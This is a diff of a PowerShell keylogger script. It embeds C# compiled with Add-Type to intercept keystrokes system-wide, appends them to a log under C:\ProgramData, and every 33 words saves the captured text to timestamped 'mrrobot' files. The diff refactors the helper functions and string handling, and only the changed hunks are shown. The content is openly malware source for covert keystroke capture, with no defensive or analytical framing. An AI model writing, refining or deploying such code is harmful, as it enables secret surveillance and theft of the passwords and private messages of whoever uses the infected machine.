@@ -1,31 +1,6 @@
 # Set log file path
 $logFile = "C:\ProgramData\keylogger.log"
 $scriptName = "Keylogger.ps1"
-$wordCount = 0
-$buffer = @()
-
-# Function to log keystrokes
-function Log-Message {
-    param (
-        [string]$message,
-        [string]$level = "INFO"
-    )
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logEntry = "$timestamp [$level] [$scriptName] $message"
-    Add-Content -Path $logFile -Value $logEntry
-}
-
-# Function to save every 33 words into a txt file
-function Save-ToMrRobot {
-    param ([string[]]$keys)
-
-    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-    $mrRobotFile = "C:\ProgramData\mrrobot_$timestamp.txt"
-
-    $content = $keys -join " "
-    Add-Content -Path $mrRobotFile -Value $content
-    Log-Message "Saved 33 words to $mrRobotFile"
-}
 
 # Load user32.dll for key interception
 $signature = @"
@@ -84,15 +59,16 @@ public class KeyLogger {
             buffer += key + " ";
             wordCount++;
 
-            // Save to keylogger file
+            // Save keystrokes to log file
             File.AppendAllText("C:\\ProgramData\\keylogger.log", key + " ");
 
-            // Save every 33 words to a mrrobot file
+            // Save every 33 words into a separate file
             if (wordCount >= 33) {
                 string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
-                string mrRobotFile = $"C:\\ProgramData\\mrrobot_{timestamp}.txt";
+                string mrRobotFile = "C:\\ProgramData\\mrrobot_" + timestamp + ".txt";
+
                 File.WriteAllText(mrRobotFile, buffer);
-                File.AppendAllText("C:\\ProgramData\\keylogger.log", $"\n[Saved to {mrRobotFile}]\n");
+                File.AppendAllText("C:\\ProgramData\\keylogger.log", "\n[Saved to " + mrRobotFile + "]\n");
 
                 buffer = "";
                 wordCount = 0;
@@ -105,9 +81,6 @@ public class KeyLogger {
 
 # Compile the C# code and load it into PowerShell
 Add-Type -TypeDefinition $signature -Language CSharp
-
-# Start logging
-Log-Message "Starting global keylogger."
 
 # Start the keylogger
 [KeyLogger]::Start()
